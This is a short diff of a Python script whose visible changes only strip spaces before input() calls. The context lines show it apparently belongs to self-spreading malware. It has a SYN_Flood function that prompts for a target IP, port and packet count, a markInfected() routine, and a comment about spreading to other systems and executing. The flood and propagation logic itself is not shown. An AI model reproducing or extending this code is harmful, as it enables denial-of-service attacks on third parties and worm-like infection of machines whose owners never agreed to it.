@@ -60,8 +60,8 @@ def SYN_Flood(dstIP,dstPort,counter):
 def info():
 	os.system("clear")
 
-	dstIP = raw_input ("\nTarget IP : ")
-	dstPort = input ("Target Port : ")
+	dstIP = raw_input("\nTarget IP : ")
+	dstPort = input("Target Port : ")
 	
 	return dstIP,int(dstPort)
 
@@ -91,7 +91,7 @@ def markInfected():
 	file_obj.close()
 
 	dstIP,dstPort = info()
-	counter = input ("How many packets do you want to send : ")
+	counter = input("How many packets do you want to send : ")
 	SYN_Flood(dstIP,dstPort,int(counter))
 ###############################################################
 # Spread to the other system and execute
